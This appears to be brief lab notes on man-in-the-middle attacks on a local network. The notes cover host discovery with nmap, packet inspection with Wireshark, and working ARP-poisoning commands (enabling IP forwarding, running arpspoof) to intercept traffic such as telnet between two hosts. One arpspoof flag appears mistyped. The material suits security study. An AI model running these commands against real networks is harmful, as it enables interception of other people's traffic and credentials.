First example of Man in the Middle will be on our own LAN. If you take your ip for example 192.168.0.1/24 and want to see what else is on the network you will want to nmap 192.168.0.0/24 -sn
From here you can enumerate them <ip> -A (scans aggressive)
Then you can wireshark it and inspect packets

--------------------ARP Poisoning--------------------------
Do the same above to see what else is on the network
From here you can actually spoof the IP of another machine and intercept traffic
If 10.100.13.36 has telnet running then
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -1 eth1 -t 10.100.13.37 -r 10.100.13.36
